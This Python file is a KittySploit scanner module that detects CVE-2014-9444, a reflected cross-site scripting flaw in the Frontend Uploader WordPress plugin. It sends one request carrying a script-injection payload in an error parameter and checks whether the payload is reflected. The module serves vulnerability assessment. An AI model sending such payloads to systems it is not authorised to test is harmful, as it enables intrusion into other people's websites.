#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Frontend Uploader WordPress plugin prior to v."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Frontend Uploader <= 0.9.2 - Cross-Site Scripting Detection',
        'description': 'The Frontend Uploader WordPress plugin prior to v.0.9.2 was affected by an unauthenticated Cross-Site Scripting security vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2014',
            'wp-plugin',
            'xss',
            'wpscan',
            'packetstorm',
            'wordpress',
            'unauth',
            'frontend_uploader_project',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/f0739b1e-22dc-4ca6-ad83-a0e80228e3c7',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-9444',
            'http://packetstormsecurity.com/files/129749/WordPress-Frontend-Uploader-0.9.2-Cross-Site-Scripting.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2014-9444',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?page_id=0&&errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Frontend Uploader <= 0.9.2 - Cross-Site Scripting detected",
                path='/?page_id=0&&errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

